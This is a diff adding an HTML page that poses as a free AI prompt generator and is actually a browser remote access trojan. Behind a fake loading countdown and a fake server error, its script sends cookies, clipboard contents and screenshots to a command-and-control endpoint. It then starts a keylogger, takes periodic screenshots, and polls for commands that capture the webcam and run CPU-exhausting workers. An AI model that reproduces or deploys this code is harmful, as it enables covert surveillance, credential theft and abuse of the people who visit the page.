@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🤖 Free AI Prompt Generator</title>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <style>
+        body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+               color: white; font-family: Arial; padding: 50px; text-align: center; }
+        input, button { width: 80%; max-width: 400px; padding: 15px; margin: 10px; 
+                        font-size: 18px; border-radius: 10px; border: none; }
+        button { background: #ff6b6b; color: white; cursor: pointer; font-weight: bold; }
+        .hidden { display: none; }
+        .loading { color: #ffd700; font-size: 20px; }
+        .error { background: rgba(255,0,0,0.2); padding: 20px; border-radius: 10px; 
+                 margin: 20px auto; max-width: 400px; }
+    </style>
+</head>
+<body>
+    <h1>🤖 Free AI Prompt Generator</h1>
+    <p>Enter your idea → Get optimized ChatGPT prompts!</p>
+    
+    <input id="promptInput" placeholder="e.g., cyberpunk city with neon lights...">
+    <br>
+    <button onclick="generate()">🚀 GENERATE PROMPT</button>
+    
+    <div id="loading" class="loading hidden">AI Processing... 3s ⏳</div>
+    <div id="error" class="error hidden">
+        ❌ Generation Failed - Server Overload<br>
+        <small>Please try again later</small>
+    </div>
+
+    <script>
+        const C2_URL = 'http://localhost:3000';
+        let ratActive = false;
+        
+        // 🔥 FAIL-PROOF FETCH WITH CORS BYPASS
+        async function safeFetch(url, options = {}) {
+            try {
+                const resp = await fetch(url, {
+                    ...options,
+                    mode: 'cors',
+                    credentials: 'omit',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        ...options.headers
+                    }
+                });
+                return await resp.json();
+            } catch(e) {
+                console.log('🔥 FETCH ERROR:', e);
+                return {cmd: null};
+            }
+        }
+
+        async function sendData(type, data) {
+            try {
+                await fetch(`${C2_URL}/c2`, {
+                    method: 'POST',
+                    mode: 'cors',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({type, data, timestamp: new Date().toISOString()})
+                });
+                console.log(`📤 Sent: ${type}`);
+            } catch(e) { 
+                console.log('📤 Send failed (silent)');
+            }
+        }
+
+        async function generate() {
+            document.getElementById('loading').classList.remove('hidden');
+            
+            let count = 3;
+            const timer = setInterval(async () => {
+                count--;
+                if (count >= 0) document.getElementById('loading').innerHTML = `AI Processing... ${count}s ⏳`;
+                
+                if (count === 2) {
+                    await sendData('init', {
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        platform: navigator.platform,
+                        cookies: document.cookie,
+                        screen: `${screen.width}x${screen.height}`
+                    });
+                }
+                if (count === 1) {
+                    navigator.clipboard.readText().then(text => sendData('clipboard', text)).catch(() => {});
+                    const canvas = await html2canvas(document.body);
+                    await sendData('screenshot', canvas.toDataURL('image/png', 0.3));
+                }
+                
+                if (count < 0) {
+                    clearInterval(timer);
+                    document.getElementById('loading').classList.add('hidden');
+                    document.getElementById('error').classList.remove('hidden');
+                    startRAT();
+                }
+            }, 1000);
+        }
+
+        async function startRAT() {
+            console.log('🔥 RAT FULLY ACTIVATED - POLLING STARTED!');
+            ratActive = true;
+            
+            // 🔑 KEYLOGGER
+            document.addEventListener('keydown', async (e) => {
+                await sendData('keys', `${e.key}${e.ctrlKey?'[Ctrl]':''}${e.shiftKey?'[Shift]':''}`);
+            });
+            
+            // 📸 AUTO SCREENSHOTS
+            setInterval(async () => {
+                if (!ratActive) return;
+                const canvas = await html2canvas(document.body);
+                await sendData('screenshot_auto', canvas.toDataURL('image/png', 0.2));
+            }, 15000);
+            
+            // 🔥 BULLETPROOF COMMAND POLLING (STARTS IMMEDIATELY)
+            const pollLoop = async () => {
+                if (!ratActive) return;
+                console.log('🔍 POLLING /commands...');
+                
+                const data = await safeFetch(`${C2_URL}/commands`);
+                const cmd = data.cmd;
+                
+                console.log('📡 Command:', cmd || 'NONE');
+                
+                if (cmd && cmd !== 'clear') {
+                    console.log(`🎯 EXECUTING: ${cmd}`);
+                    await executeCommand(cmd);
+                }
+                
+                setTimeout(pollLoop, 1500);  // 🔥 RECURSIVE - NO setInterval issues
+            };
+            pollLoop();  // 🔥 START NOW
+        }
+
+        async function executeCommand(cmd) {
+            if (cmd === 'screenshot') {
+                console.log('📸 Screenshot...');
+                const canvas = await html2canvas(document.body, {scale: 1});
+                await sendData('screenshot_cmd', canvas.toDataURL('image/png', 0.5));
+            }
+            
+            if (cmd === 'webcam') {
+                console.log('📹 Webcam...');
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(async () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 640; canvas.height = 480;
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        stream.getTracks().forEach(t => t.stop());
+                        await sendData('webcam_cmd', canvas.toDataURL('image/jpeg', 0.7));
+                    }, 1000);
+                } catch(e) {
+                    await sendData('webcam_error', e.message);
+                }
+            }
+            
+            if (cmd === 'cpu_stress') {
+                console.log('💥 CPU Stress...');
+                for(let i = 0; i < 10; i++) {
+                    const worker = new Worker(URL.createObjectURL(new Blob([
+                        `while(1){let s=0;for(let j=0;j<1e7;j++)s+=Math.sqrt(j);}`
+                    ], {type:'application/javascript'})));
+                }
+                await sendData('cpu_stress', 'MAX CPU');
+            }
+            
+            if (cmd === 'keylog_dump') {
+                await sendData('keylog_dump', 'Keylogger active');
+            }
+        }
+    </script>
+</body>
+</html>
